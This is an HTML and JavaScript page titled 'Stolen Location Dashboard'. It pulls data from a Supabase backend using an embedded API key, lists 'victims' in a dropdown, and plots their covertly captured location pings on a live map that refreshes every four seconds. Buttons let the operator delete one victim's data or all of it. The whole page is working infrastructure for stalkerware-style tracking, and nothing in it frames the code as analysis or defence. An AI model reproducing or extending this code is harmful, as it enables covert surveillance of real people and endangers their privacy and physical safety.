<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Stolen Location Dashboard</title>
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
  <style>
    body { margin:0; background:#111; color:#0f0; font-family:Arial; }
    #map { height:65vh; width:100%; }
    .controls { padding:15px; background:#1a1a1a; text-align:center; }
    select, button { padding:12px; margin:5px; font-size:16px; }
    .delete-victim { background:#c00; color:white; font-weight:bold; }
    .delete-all { background:#900; color:white; font-weight:bold; padding:14px 25px; }
    .activity { padding:15px; background:#1a1a1a; max-height:220px; overflow-y:auto; }
    .log { padding:10px; margin:5px 0; background:#222; }
  </style>
</head>
<body>
  <h1>🔴 LIVE STOLEN LOCATION TRACKER</h1>
  
  <div class="controls">
    <strong>Select Victim: </strong>
    <select id="victimSelect" onchange="loadSelectedVictim()" style="width:420px;"></select>
    <button class="delete-victim" onclick="deleteCurrentVictim()">🗑 Delete This Victim</button>
    <button class="delete-all" onclick="deleteAllVictims()">☠️ DELETE ALL VICTIMS</button>
  </div>

  <div id="map"></div>

  <h2 style="padding:10px;">📢 Activity Log</h2>
  <div class="activity" id="activityLog"></div>

  <script>
    const SUPABASE_URL = "https://yvwnnridpgelbewhoxps.supabase.co";
    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl2d25ucmlkcGdlbGJld2hveHBzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4NDAyMzMsImV4cCI6MjA5NjQxNjIzM30.P1dXFozH5SpHdZEAU2SB2Lh8TMAhAGxCuPEyTj_BL44";

    const map = L.map('map').setView([20.5937, 78.9629], 6);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

    let currentVictimId = "";

    async function loadVictimsList() {
      const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?select=id,label,owner_id,created_at&order=created_at.desc`, {
        headers: { "apikey": SUPABASE_KEY }
      });
      const victims = await res.json();
      
      const select = document.getElementById('victimSelect');
      select.innerHTML = '<option value="">-- Select Victim --</option>';
      
      victims.forEach(v => {
        const opt = document.createElement('option');
        opt.value = v.id;
        opt.textContent = `${v.label} (${v.owner_id})`;
        select.appendChild(opt);
      });
    }

    async function loadSelectedVictim() {
      currentVictimId = document.getElementById('victimSelect').value;
      if (currentVictimId) loadLiveData();
    }

    async function loadLiveData() {
      if (!currentVictimId) return;
      const res = await fetch(`${SUPABASE_URL}/rest/v1/location_pings?session_id=eq.${currentVictimId}&order=created_at.desc`, {
        headers: { "apikey": SUPABASE_KEY }
      });
      const data = await res.json();

      map.eachLayer(layer => { if (layer instanceof L.Marker) map.removeLayer(layer); });

      const bounds = [];
      data.forEach(item => {
        if (item.lat && item.lon) {
          const marker = L.marker([item.lat, item.lon]).addTo(map);
          marker.bindPopup(`Time: ${new Date(item.created_at).toLocaleString()}`);
          bounds.push([item.lat, item.lon]);
        }
      });

      if (bounds.length > 0) {
        map.fitBounds(bounds, { padding: [80, 80], maxZoom: 18 });
      }
    }

    async function loadActivityLog() {
      const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?select=id,label,owner_id,created_at&order=created_at.desc&limit=10`, {
        headers: { "apikey": SUPABASE_KEY }
      });
      const sessions = await res.json();
      const logDiv = document.getElementById('activityLog');
      logDiv.innerHTML = "";

      sessions.forEach(s => {
        const div = document.createElement('div');
        div.className = "log";
        div.innerHTML = `✅ <strong>${s.label}</strong> (${s.owner_id})<br><small>${new Date(s.created_at).toLocaleString()}</small>`;
        logDiv.appendChild(div);
      });
    }

    async function deleteCurrentVictim() {
      if (!currentVictimId) return alert("Select a victim first");
      if (!confirm("Delete this victim?")) return;

      await fetch(`${SUPABASE_URL}/rest/v1/location_pings?session_id=eq.${currentVictimId}`, { method: "DELETE", headers: { "apikey": SUPABASE_KEY }});
      await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?id=eq.${currentVictimId}`, { method: "DELETE", headers: { "apikey": SUPABASE_KEY }});

      alert("Victim deleted!");
      currentVictimId = "";
      await loadVictimsList();
      loadLiveData();
      loadActivityLog();
    }

    async function deleteAllVictims() {
      if (!confirm("⚠️ DELETE ALL VICTIMS AND ALL DATA?\nThis cannot be undone!")) return;

      await fetch(`${SUPABASE_URL}/rest/v1/location_pings`, { method: "DELETE", headers: { "apikey": SUPABASE_KEY }});
      await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions`, { method: "DELETE", headers: { "apikey": SUPABASE_KEY }});

      alert("✅ ALL VICTIMS DELETED SUCCESSFULLY!");

      currentVictimId = "";
      await loadVictimsList();     // Refresh dropdown
      loadLiveData();
      loadActivityLog();
    }

    // Initial Load
    loadVictimsList();
    loadLiveData();
    loadActivityLog();

    setInterval(() => {
      if (currentVictimId) loadLiveData();
      loadActivityLog();
    }, 4000);
  </script>
</body>
</html>
